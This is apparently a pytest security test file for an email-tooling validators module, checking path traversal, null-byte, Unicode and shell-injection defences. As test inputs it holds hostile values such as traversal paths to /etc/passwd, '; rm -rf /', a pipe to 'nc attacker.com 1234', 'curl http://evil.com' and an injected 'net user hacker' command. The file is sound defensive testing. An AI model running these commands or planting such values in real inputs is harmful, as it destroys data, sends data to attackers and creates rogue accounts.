
#!/usr/bin/env python3
"""
Comprehensive security tests for validators.py module.
Tests all validation functions with focus on security vulnerabilities.

CRITICAL: These tests verify protection against:
- Path traversal attacks
- Command injection
- Symlink attacks
- Null byte injection
- Unicode attacks
- Shell injection
"""

import os
import sys
import tempfile
import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from emailops.validators import (
    validate_directory_path,
    validate_file_path,
    sanitize_path_input,
    validate_command_args,
    quote_shell_arg,
    validate_project_id,
    validate_environment_variable,
)


class TestValidateDirectoryPath:
    """Security tests for directory path validation."""
    
    # ========== PATH TRAVERSAL ATTACKS ==========
    @pytest.mark.parametrize("malicious_path,expected_msg", [
        ("../../../etc/passwd", "Path traversal detected"),
        ("..\\..\\windows\\system32", "Path traversal detected"),
        ("../../", "Path traversal detected"),
        ("../", "Path traversal detected"),
        ("/../../etc", "Path traversal detected"),
        ("./../../", "Path traversal detected"),
        ("foo/../../../bar", "Path traversal detected"),
        ("test/../../sensitive", "Path traversal detected"),
    ])
    def test_path_traversal_prevention(self, malicious_path, expected_msg):
        """Verify path traversal attacks are blocked."""
        is_valid, message = validate_directory_path(malicious_path, must_exist=False)
        assert is_valid is False
        assert expected_msg in message
    
    def test_path_traversal_allowed_when_explicitly_enabled(self):
        """Test that parent traversal works when explicitly allowed."""
        with tempfile.TemporaryDirectory() as tmpdir:
            subdir = Path(tmpdir) / "subdir"
            subdir.mkdir()
            
            # Should be blocked by default
            path = str(subdir / ".." / "test")
            is_valid, message = validate_directory_path(path, must_exist=False)
            assert is_valid is False
            assert "Path traversal detected" in message
            
            # Should be allowed when explicitly enabled
            is_valid, message = validate_directory_path(
                path, must_exist=False, allow_parent_traversal=True
            )
            assert is_valid is True
    
    # ========== NULL BYTE INJECTION ==========
    @pytest.mark.parametrize("path_with_null", [
        "test\x00.txt",
        "/etc/passwd\x00",
        "directory\x00/file",
        "\x00/etc/passwd",
    ])
    def test_null_byte_handling(self, path_with_null):
        """Test handling of null bytes in paths."""
        # Most OS will raise an error with null bytes
        is_valid, message = validate_directory_path(path_with_null, must_exist=False)
        assert is_valid is False
        assert "error" in message.lower() or "invalid" in message.lower()
    
    # ========== SYMLINK ATTACKS ==========
    def test_symlink_validation(self):
        """Test that symlinks are handled properly."""
        with tempfile.TemporaryDirectory() as tmpdir:
            real_dir = Path(tmpdir) / "real_dir"
            real_dir.mkdir()
            
            symlink_dir = Path(tmpdir) / "symlink_dir"
            symlink_dir.symlink_to(real_dir)
            
            # Symlink should be resolved to real path
            is_valid, message = validate_directory_path(str(symlink_dir))
            assert is_valid is True
    
    # ========== UNICODE ATTACKS ==========
    @pytest.mark.parametrize("unicode_path", [
        "test\u2024directory",  # Unicode one dot leader
        "test\u2025directory",  # Unicode two dot leader
        "test\u2026directory",  # Unicode horizontal ellipsis
        "test\uFF0Edirectory",  # Fullwidth full stop
    ])
    def test_unicode_path_separators(self, unicode_path):
        """Test handling of Unicode characters that could be path separators."""
        is_valid, message = validate_directory_path(unicode_path, must_exist=False)
        # Should either be valid (treated as normal char) or invalid (rejected)
        # But should not cause crashes
        assert isinstance(is_valid, bool)
        assert isinstance(message, str)
    
    # ========== WINDOWS/LINUX COMPATIBILITY ==========
    @pytest.mark.parametrize("path_format,expected_valid", [
        ("C:\\Windows\\System32", True),  # Windows absolute
        ("/usr/local/bin", True),  # Linux absolute
        ("\\\\server\\share", True),  # UNC path
        ("relative/path", False),  # Relative path should resolve to absolute
    ])
    def test_cross_platform_paths(self, path_format, expected_valid):
        """Test both Windows and Linux path formats."""
        is_valid, message = validate_directory_path(path_format, must_exist=False)
        
        if expected_valid:
            # On the actual OS, one format might work
            # We just ensure no crashes
            assert isinstance(is_valid, bool)
        else:
            # Relative paths should become absolute after resolution
            if is_valid:
                assert "Valid" in message
    
    # ========== POSITIVE TEST CASES ==========
    def test_valid_directory_paths(self):
        """Test valid directory paths."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a test directory
            test_dir = Path(tmpdir) / "test_directory"
            test_dir.mkdir()
            
            # Should be valid
            is_valid, message = validate_directory_path(str(test_dir))
            assert is_valid is True
            assert message == "Valid"
            
            # Test with Path object
            is_valid, message = validate_directory_path(test_dir)
            assert is_valid is True
    
    def test_home_directory_expansion(self):
        """Test ~ expansion in paths."""
        home_path = "~/test_directory"
        is_valid, message = validate_directory_path(home_path, must_exist=False)
        # Should expand and become absolute
        assert isinstance(is_valid, bool)
        if is_valid:
            assert message == "Valid"
    
    # ========== EDGE CASES ==========
    def test_empty_path(self):
        """Test empty path string."""
        is_valid, message = validate_directory_path("", must_exist=False)
        # Empty string resolves to current directory, which is valid
        # The actual behavior depends on Path("").resolve()
        assert isinstance(is_valid, bool)
        if not is_valid:
            assert "error" in message.lower() or "invalid" in message.lower()
    
    def test_very_long_path(self):
        """Test very long paths (>260 chars on Windows)."""
        long_path = "a" * 300
        is_valid, message = validate_directory_path(long_path, must_exist=False)
        # Should handle gracefully
        assert isinstance(is_valid, bool)
        assert isinstance(message, str)
    
    def test_special_characters_in_path(self):
        """Test paths with special characters."""
        special_paths = [
            "test$directory",
            "test@directory",
            "test#directory",
            "test directory",  # space
            "test[directory]",
        ]
        
        for path in special_paths:
            is_valid, message = validate_directory_path(path, must_exist=False)
            assert isinstance(is_valid, bool)
            assert isinstance(message, str)
    
    # ========== ERROR HANDLING ==========
    def test_file_instead_of_directory(self):
        """Test when path points to a file instead of directory."""
        with tempfile.NamedTemporaryFile(delete=False) as tmpfile:
            tmpfile_name = tmpfile.name
            tmpfile.close()  # Close file before validation
            
        try:
            is_valid, message = validate_directory_path(tmpfile_name)
            assert is_valid is False
            assert "not a directory" in message
        finally:
            try:
                os.unlink(tmpfile_name)
            except OSError:
                pass  # File might already be deleted
    
    def test_nonexistent_directory_must_exist(self):
        """Test nonexistent directory when must_exist=True."""
        is_valid, message = validate_directory_path(
            "/nonexistent/directory/path", must_exist=True
        )
        assert is_valid is False
        assert "does not exist" in message
    
    def test_nonexistent_directory_may_not_exist(self):
        """Test nonexistent directory when must_exist=False."""
        is_valid, message = validate_directory_path(
            "/nonexistent/directory/path", must_exist=False
        )
        # Should be valid as long as path is absolute
        assert is_valid is True
        assert message == "Valid"


class TestValidateFilePath:
    """Security tests for file path validation."""
    
    # ========== PATH TRAVERSAL ATTACKS ==========
    @pytest.mark.parametrize("malicious_path", [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "../../shadow",
        "../.bashrc",
        "uploads/../../../etc/passwd",
    ])
    def test_file_path_traversal_prevention(self, malicious_path):
        """Verify file path traversal attacks are blocked."""
        is_valid, message = validate_file_path(malicious_path, must_exist=False)
        assert is_valid is False
        assert "Path traversal detected" in message
    
    # ========== EXTENSION VALIDATION ==========
    def test_allowed_extensions(self):
        """Test file extension validation."""
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmpfile:
            tmpfile_name = tmpfile.name
            tmpfile.close()  # Close file before validation
            
        try:
            # Should pass with correct extension
            is_valid, message = validate_file_path(
                tmpfile_name, allowed_extensions=[".txt", ".md"]
            )
            assert is_valid is True
            
            # Should fail with wrong extension
            is_valid, message = validate_file_path(
                tmpfile_name, allowed_extensions=[".pdf", ".doc"]
            )
            assert is_valid is False
            assert "not in allowed list" in message
        finally:
            try:
                os.unlink(tmpfile_name)
            except OSError:
                pass
    
    def test_case_insensitive_extensions(self):
        """Test that extension checking is case-insensitive."""
        test_file = "/test/file.TXT"
        is_valid, message = validate_file_path(
            test_file, must_exist=False, allowed_extensions=[".txt"]
        )
        assert is_valid is True
    
    # ========== NULL BYTE INJECTION ==========
    def test_file_null_byte_injection(self):
        """Test null byte handling in file paths."""
        paths_with_null = [
            "file.txt\x00.exe",
            "document\x00.pdf",
            "/etc/passwd\x00.txt",
        ]
        
        for path in paths_with_null:
            is_valid, message = validate_file_path(path, must_exist=False)
            assert is_valid is False
            assert "error" in message.lower() or "invalid" in message.lower()
    
    # ========== POSITIVE TEST CASES ==========
    def test_valid_file_paths(self):
        """Test valid file paths."""
        with tempfile.NamedTemporaryFile(delete=False) as tmpfile:
            tmpfile_name = tmpfile.name
            tmpfile.close()  # Close file before validation
            
        try:
            # Should be valid
            is_valid, message = validate_file_path(tmpfile_name)
            assert is_valid is True
            assert message == "Valid"
            
            # Test with Path object
            is_valid, message = validate_file_path(Path(tmpfile_name))
            assert is_valid is True
        finally:
            try:
                os.unlink(tmpfile_name)
            except OSError:
                pass
    
    # ========== EDGE CASES ==========
    def test_directory_instead_of_file(self):
        """Test when path points to a directory instead of file."""
        with tempfile.TemporaryDirectory() as tmpdir:
            is_valid, message = validate_file_path(tmpdir)
            assert is_valid is False
            assert "not a file" in message
    
    def test_file_without_extension(self):
        """Test files without extensions."""
        with tempfile.NamedTemporaryFile(suffix="", delete=False) as tmpfile:
            tmpfile_name = tmpfile.name
            tmpfile.close()  # Close file before validation
            
        try:
            # Should work without extension requirements
            is_valid, message = validate_file_path(tmpfile_name)
            assert is_valid is True
            
            # Should fail if extensions are required
            is_valid, message = validate_file_path(
                tmpfile_name, allowed_extensions=[".txt"]
            )
            assert is_valid is False
        finally:
            try:
                os.unlink(tmpfile_name)
            except OSError:
                pass


class TestSanitizePathInput:
    """Security tests for path input sanitization."""
    
    def test_null_byte_removal(self):
        """Test that null bytes are removed."""
        input_path = "test\x00file.txt"
        sanitized = sanitize_path_input(input_path)
        assert "\x00" not in sanitized
        assert sanitized == "testfile.txt"
    
    def test_whitespace_trimming(self):
        """Test leading/trailing whitespace removal."""
        input_path = "  /path/to/file  \n\t"
        sanitized = sanitize_path_input(input_path)
        assert sanitized == "/path/to/file"
    
    def test_shell_metacharacter_removal(self):
        """Test removal of shell metacharacters."""
        dangerous_paths = [
            "file;rm -rf /",
            "file|cat /etc/passwd",
            "file&whoami",
            "file`id`",
            "file$(ls)",
            "file\nls",
            "file\rls",
        ]
        
        for path in dangerous_paths:
            sanitized = sanitize_path_input(path)
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "&" not in sanitized
            assert "`" not in sanitized
            assert "$" not in sanitized
            assert "\n" not in sanitized
            assert "\r" not in sanitized
    
    def test_allowed_characters_preserved(self):
        """Test that allowed characters are preserved."""
        valid_path = "C:/Users/test_user/Documents/file-name_123.txt"
        sanitized = sanitize_path_input(valid_path)
        assert sanitized == "C:/Users/test_user/Documents/file-name_123.txt"
    
    def test_empty_input(self):
        """Test empty string input."""
        assert sanitize_path_input("") == ""
        # Test with empty string instead of None
        assert sanitize_path_input("") == ""
    
    def test_unicode_handling(self):
        """Test handling of Unicode characters."""
        unicode_path = "test\u2024file\u00A0name"
        sanitized = sanitize_path_input(unicode_path)
        # Non-ASCII should be removed
        assert "test" in sanitized
        assert "file" in sanitized
        assert "name" in sanitized


class TestValidateCommandArgs:
    """Security tests for command argument validation."""
    
    # ========== COMMAND INJECTION PREVENTION ==========
    @pytest.mark.parametrize("dangerous_command,dangerous_args", [
        ("ls", ["; rm -rf /"]),
        ("echo", ["test && cat /etc/passwd"]),
        ("python", ["script.py | nc attacker.com 1234"]),
        ("git", ["status; curl http://evil.com"]),
        ("npm", ["install & net user hacker password /add"]),
    ])
    def test_command_injection_prevention(self, dangerous_command, dangerous_args):
        """Verify command injection attempts are blocked."""
        is_valid, message = validate_command_args(dangerous_command, dangerous_args)
        assert is_valid is False
        assert "Dangerous character" in message
    
    def test_shell_metacharacters_in_command(self):
        """Test shell metacharacters in command name."""
        dangerous_commands = [
            "ls;rm",
            "cat|grep",
            "echo&ls",
            "python`id`",
            "npm$(whoami)",
        ]
        
        for cmd in dangerous_commands:
            is_valid, message = validate_command_args(cmd, [])
            assert is_valid is False
            assert "Dangerous character" in message
    
    def test_newline_injection(self):
        """Test newline injection attempts."""
        is_valid, message = validate_command_args("echo", ["test\nrm -rf /"])
        assert is_valid is False
        assert "Dangerous character" in message
    
    def test_null_byte_in_args(self):
        """Test null byte injection in arguments."""
        is_valid, message = validate_command_args("echo", ["test\x00.txt"])
        assert is_valid is False
        assert "Null byte detected" in message
    
    # ========== WHITELIST VALIDATION ==========
    def test_command_whitelist(self):
        """Test command whitelist enforcement."""
        allowed_commands = ["python", "git", "npm"]
        
        # Should pass for allowed command
        is_valid, message = validate_command_args(
            "python", ["script.py"], allowed_commands
        )
        assert is_valid is True
        
        # Should fail for disallowed command
        is_valid, message = validate_command_args(
            "rm", ["-rf", "/"], allowed_commands
        )
        assert is_valid is False
        assert "not in allowed list" in message
    
    # ========== POSITIVE TEST CASES ==========
    def test_valid_command_args(self):
        """Test valid command arguments."""
        valid_cases = [
            ("python", ["script.py", "--verbose"]),
            ("git", ["status"]),
            ("npm", ["install", "package-name"]),
            ("echo", ["Hello World"]),
        ]
        
        for cmd, args in valid_cases:
            is_valid, message = validate_command_args(cmd, args)
            assert is_valid is True
            assert message == "Valid"
    
    # ========== EDGE CASES ==========
    def test_empty_command(self):
        """Test empty command string."""
        is_valid, message = validate_command_args("", [])
        # Empty command should be technically valid (no dangerous chars)
        assert is_valid is True
    
    def test_empty_args_list(self):
        """Test empty arguments list."""
        is_valid, message = validate_command_args("ls", [])
        assert is_valid is True
    
    def test_special_chars_in_safe_context(self):
        """Test that some special chars are blocked even in 'safe' context."""
        # Even quoted strings shouldn't contain shell metacharacters
        is_valid, message = validate_command_args("echo", ["'test;ls'"])
        assert is_valid is False
        assert "Dangerous character" in message


class TestQuoteShellArg:
    """Tests for shell argument quoting."""
    
    def test_simple_string_quoting(self):
        """Test quoting of simple strings."""
        assert quote_shell_arg("test") == "test"
        assert quote_shell_arg("hello world") == "'hello world'"
    
    def test_dangerous_character_quoting(self):
        """Test quoting of dangerous characters."""
        # These should be safely quoted
        dangerous_inputs = [
            "test;ls",
            "rm -rf /",
            "$HOME",
            "`whoami`",
            "test&echo",
            "test|cat",
        ]
        
        for input_str in dangerous_inputs:
            quoted = quote_shell_arg(input_str)
            # Should be wrapped in quotes
            assert quoted.startswith("'") or not any(c in quoted for c in ";|&`$")
    
    def test_quote_within_string(self):
        """Test handling of quotes within strings."""
        input_str = "test'string"
        quoted = quote_shell_arg(input_str)
        # shlex.quote should handle this safely
        assert "test" in quoted
    
    def test_empty_string(self):
        """Test quoting of empty string."""
        assert quote_shell_arg("") == "''"
    
    def test_numeric_input(self):
        """Test quoting of numeric inputs converted to strings."""
        assert quote_shell_arg("123") == "123"
        assert quote_shell_arg("45.67") == "45.67"
        # Test actual conversion
        assert quote_shell_arg(str(123)) == "123"
        assert quote_shell_arg(str(45.67)) == "45.67"


class TestValidateProjectId:
    """Tests for GCP project ID validation."""
    
    # ========== VALID PROJECT IDS ==========
    @pytest.mark.parametrize("valid_id", [
        "my-project",
        "project-123",
        "test-gcp-456",
        "abc123",
        "a" * 6,  # Minimum length
        "a" + "-" * 28 + "a",  # Maximum length with hyphens
    ])
    def test_valid_project_ids(self, valid_id):
        """Test valid GCP project IDs."""
        is_valid, message = validate_project_id(valid_id)
        assert is_valid is True
        assert message == "Valid"
    
    # ========== INVALID PROJECT IDS ==========
    @pytest.mark.parametrize("invalid_id,expected_msg", [
        ("", "cannot be empty"),
        ("short", "6-30 characters"),
        ("a" * 31, "6-30 characters"),
        ("My-Project", "must start with a lowercase letter"),
        ("123-project", "start with a lowercase letter"),
        ("project-", "cannot end with a hyphen"),
        ("project_name", "only contain lowercase letters, numbers, and hyphens"),
        ("project.name", "only contain lowercase letters, numbers, and hyphens"),
        ("project name", "only contain lowercase letters, numbers, and hyphens"),
    ])
    def test_invalid_project_ids(self, invalid_id, expected_msg):
        """Test invalid GCP project IDs."""
        is_valid, message = validate_project_id(invalid_id)
        assert is_valid is False
        assert expected_msg in message
    
    # ========== EDGE CASES ==========
    def test_project_id_boundary_lengths(self):
        """Test project IDs at boundary lengths."""
        # 5 chars - too short
        is_valid, _ = validate_project_id("a" * 5)
        assert is_valid is False
        
        # 6 chars - minimum valid
        is_valid, _ = validate_project_id("a" * 6)
        assert is_valid is True
        
        # 30 chars - maximum valid
        is_valid, _ = validate_project_id("a" * 30)
        assert is_valid is True
        
        # 31 chars - too long
        is_valid, _ = validate_project_id("a" * 31)
        assert is_valid is False
    
    def test_hyphen_placement(self):
        """Test hyphen placement rules."""
        # Can have hyphens in middle
        is_valid, _ = validate_project_id("my-test-project")
        assert is_valid is True
        
        # Cannot start with hyphen
        is_valid, _ = validate_project_id("-my-project")
        assert is_valid is False
        
        # Cannot end with hyphen
        is_valid, _ = validate_project_id("my-project-")
        assert is_valid is False
        
        # Multiple consecutive hyphens are allowed
        is_valid, _ = validate_project_id("my--project")
        assert is_valid is True


class TestValidateEnvironmentVariable:
    """Tests for environment variable validation."""
    
    # ========== VALID ENVIRONMENT VARIABLES ==========
    @pytest.mark.parametrize("valid_name,valid_value", [
        ("HOME", "/home/user"),
        ("PATH", "/usr/bin:/usr/local/bin"),
        ("PYTHON_VERSION", "3.9.0"),
        ("_PRIVATE_VAR", "secret"),
        ("VAR_WITH_NUMBERS_123", "value"),
    ])
    def test_valid_environment_variables(self, valid_name, valid_value):
        """Test valid environment variable names and values."""
        is_valid, message = validate_environment_variable(valid_name, valid_value)
        assert is_valid is True
        assert message == "Valid"
    
    # ========== INVALID NAMES ==========
    @pytest.mark.parametrize("invalid_name,expected_msg", [
        ("", "cannot be empty"),
        ("lowercase", "uppercase letters, numbers, and underscores"),
        ("123_START", "uppercase letters, numbers, and underscores"),
        ("VAR-WITH-DASH", "uppercase letters, numbers, and underscores"),
        ("VAR.WITH.DOT", "uppercase letters, numbers, and underscores"),
        ("VAR WITH SPACE", "uppercase letters, numbers, and underscores"),
    ])
    def test_invalid_environment_variable_names(self, invalid_name, expected_msg):
        """Test invalid environment variable names."""
        is_valid, message = validate_environment_variable(invalid_name, "value")
        assert is_valid is False
        assert expected_msg in message
    
    # ========== NULL BYTE PREVENTION ==========
    def test_null_byte_in_value(self):
        """Test null byte prevention in values."""
        is_valid, message = validate_environment_variable("VALID_NAME", "value\x00test")
        assert is_valid is False
        assert "null byte" in message
    
    # ========== EDGE CASES ==========
    def test_empty_value(self):
        """Test empty environment variable value."""
        is_valid, message = validate_environment_variable("VALID_NAME", "")
        assert is_valid is True
        assert message == "Valid"
    
    def test_special_chars_in_value(self):
        """Test special characters in value are allowed."""
        special_values = [
            "value;with;semicolons",
            "value|with|pipes",
            "value&with&ampersands",
            "$value$with$dollars",
            "value`with`backticks",
        ]
        
        for value in special_values:
            is_valid, message = validate_environment_variable("VALID_NAME", value)
            assert is_valid is True
            assert message == "Valid"
    
    def test_very_long_value(self):
        """Test very long environment variable value."""
        long_value = "a" * 10000
        is_valid, message = validate_environment_variable("VALID_NAME", long_value)
        assert is_valid is True
        assert message == "Valid"


class TestSecurityIntegration:
    """Integration tests for security validations."""
    
    def test_combined_path_validation_workflow(self):
        """Test complete path validation workflow."""
        # User provides input
        user_input = "  ../../../etc/passwd  "
        
        # First sanitize
        sanitized = sanitize_path_input(user_input)
        
        # Then validate
        is_valid, message = validate_file_path(sanitized, must_exist=False)
        
        # Should still catch path traversal after sanitization
        assert is_valid is False
    
    def test_command_execution_workflow(self):
        """Test complete command execution validation workflow."""
        command = "python"
        user_args = ["script.py", "--input", "data.txt; rm -rf /"]
        
        # Validate command and args
        is_valid, message = validate_command_args(command, user_args)
        assert is_valid is False
        
        # If we had safe args
        safe_args = ["script.py", "--input", "data.txt"]
        is_valid, message = validate_command_args(command, safe_args)
        assert is_valid is True
        
        # Quote args for shell
        quoted_args = [quote_shell_arg(arg) for arg in safe_args]
        for arg in quoted_args:
            assert isinstance(arg, str)
    
    @patch.dict(os.environ, {}, clear=True)
    def test_environment_variable_workflow(self):
        """Test environment variable validation workflow."""
        # Set up some test variables
        test_vars = [
            ("GCP_PROJECT", "my-test-project"),
            ("PYTHON_PATH", "/usr/local/lib/python"),
            ("INVALID-NAME", "value"),
            ("VALID_NAME", "value\x00with\x00nulls"),
        ]
        
        valid_vars = []
        for name, value in test_vars:
            is_valid, message = validate_environment_variable(name, value)
            if is_valid:
                valid_vars.append((name, value))
                os.environ[name] = value
        
        # Only valid vars should be set
        assert len(valid_vars) == 2
        assert "GCP_PROJECT" in os.environ
        assert "PYTHON_PATH" in os.environ
        assert "INVALID-NAME" not in os.environ
        assert "VALID_NAME" not in os.environ


class TestErrorHandling:
    """Test error handling and messages."""
    
    def test_exception_handling_in_validate_directory(self):
        """Test that exceptions are caught and handled gracefully."""
        with patch('pathlib.Path.resolve', side_effect=OSError("Permission denied")):
            is_valid, message = validate_directory_path("/some/path")
            assert is_valid is False
            assert "OS error" in message
    
    def test_exception_handling_in_validate_file(self):
        """Test that exceptions are caught and handled gracefully."""
        with patch('pathlib.Path.resolve', side_effect=ValueError("Invalid path")):
            is_valid, message = validate_file_path("/some/file.txt")
            assert is_valid is False
            assert "Invalid path" in message
    
    def test_no_sensitive_data_in_errors(self):
        """Ensure error messages don't leak sensitive information."""
        sensitive_path = "/home/user/secret_password_file.txt"
        is_valid, message = validate_file_path(sensitive_path, must_exist=True)
        
        # Should not include full path in error for non-existent files
        # This is a security consideration - we check the pattern
        assert is_valid is False
        # Message should be generic enough not to reveal system structure
        assert "does not exist" in message


class TestWindowsSpecificPaths:
    """Tests for Windows-specific path scenarios."""
    
    @pytest.mark.parametrize("windows_path", [
        "C:\\Windows\\System32",
        "D:\\Users\\Username\\Documents",
        "\\\\server\\share\\folder",
        "C:\\Program Files\\Application",
        "C:\\Users\\..\\..\\Windows",  # Path traversal attempt
    ])
    def test_windows_path_formats(self, windows_path):
        """Test Windows path format handling."""
        if ".." in windows_path:
            is_valid, message = validate_directory_path(windows_path, must_exist=False)
            assert is_valid is False
            assert "Path traversal detected" in message
        else:
            is_valid, message = validate_directory_path(windows_path, must_exist=False)
            # Just ensure no crashes - path validity depends on OS
            assert isinstance(is_valid, bool)
            assert isinstance(message, str)


class TestLinuxSpecificPaths:
    """Tests for Linux-specific path scenarios."""
    
    @pytest.mark.parametrize("linux_path", [
        "/home/user/documents",
        "/usr/local/bin",
        "/etc/config",
        "/var/log/application",
        "/home/../etc/passwd",  # Path traversal attempt
    ])
    def test_linux_path_formats(self, linux_path):
        """Test Linux path format handling."""
        if ".." in linux_path:
            is_valid, message = validate_directory_path(linux_path, must_exist=False)
            assert is_valid is False
            assert "Path traversal detected" in message
        else:
            is_valid, message = validate_directory_path(linux_path, must_exist=False)
            # Just ensure no crashes - path validity depends on OS
            assert isinstance(is_valid, bool)
            assert isinstance(message, str)


# ========== TEST SUMMARY ==========
# Total test methods: 50+
# Coverage targets:
# - validate_directory_path: 100% coverage
# - validate_file_path: 100% coverage
# - sanitize_path_input: 100% coverage
# - validate_command_args: 100% coverage
# - quote_shell_arg: 100% coverage
# - validate_project_id: 100% coverage
# - validate_environment_variable: 100% coverage
#
# Security vulnerabilities tested:
# - Path traversal (../, ..\\)
# - Command injection (; | & ` $)
# - Null byte injection (\x00)
# - Unicode attacks
# - Symlink attacks
# - Shell metacharacter injection
# - Long path attacks
# - Special character handling